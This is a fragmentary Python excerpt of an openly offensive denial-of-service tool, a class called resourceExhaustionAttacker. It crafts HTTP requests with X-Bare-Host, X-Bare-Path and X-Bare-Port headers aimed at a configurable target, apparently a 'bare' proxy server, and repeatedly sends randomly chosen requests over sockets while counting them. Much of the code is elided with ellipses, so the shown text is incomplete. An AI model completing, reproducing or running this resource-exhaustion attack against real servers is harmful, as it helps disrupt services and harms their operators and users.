...
class resourceExhaustionAttacker:
    def __init__(self):
        ...
        self.requests = self.generate_http_requests()
    ...
    def generate_http_requests(self):
        ...
        for i in range(10):
            request = (
                ...
                f"X-Bare-Headers: {{\"accept\": \"*/*\", \"user-agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\", \"Host\":\"{self.target_host}\", \"X-Bare-Path\": \"{self.target_path}\", \"X-Bare-Host\": \"{self.target_host}\"}}\r\n"
                f"X-Bare-Host: {self.target_host}\r\n"
                f"X-Bare-Path: {self.target_path}\r\n"
                f"X-Bare-Port: {self.target_port}\r\n"
                    ...
                    try:
                        ...
                        try:
                            ...
                            if data:
                                ...
                                sock.send(random.choice(self.requests))
                                self.stats['requests_sent'] += 1
                        except:
